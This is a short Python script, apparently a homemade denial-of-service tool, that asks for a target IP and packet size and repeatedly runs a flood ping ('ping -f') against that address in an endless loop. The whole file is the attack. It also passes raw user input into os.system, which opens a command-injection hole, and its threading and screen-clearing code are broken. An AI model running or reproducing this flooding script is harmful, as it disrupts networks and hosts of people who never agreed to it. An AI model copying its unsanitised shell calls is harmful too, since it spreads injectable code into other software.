#!/usr/bin/env python3

"""
~
Author @Codex-ops
~
"""
#Modules
import os
import threading

#Defines
CLEAR = "clear" or "cls"

#Users input 
MAX = input("Enter Data Amount ---> ")
os.system(CLEAR)
ip = input("Enter IP ---> ")

#function
print("CRTL + Z to exit")

while True:
  print(f'Flooding {ip} with {MAX} packet(s).')
  threading.Thread(None, os.system(f'ping -f -i 0.2 -s {MAX} ' + ip))
  os.system(CLEAR)
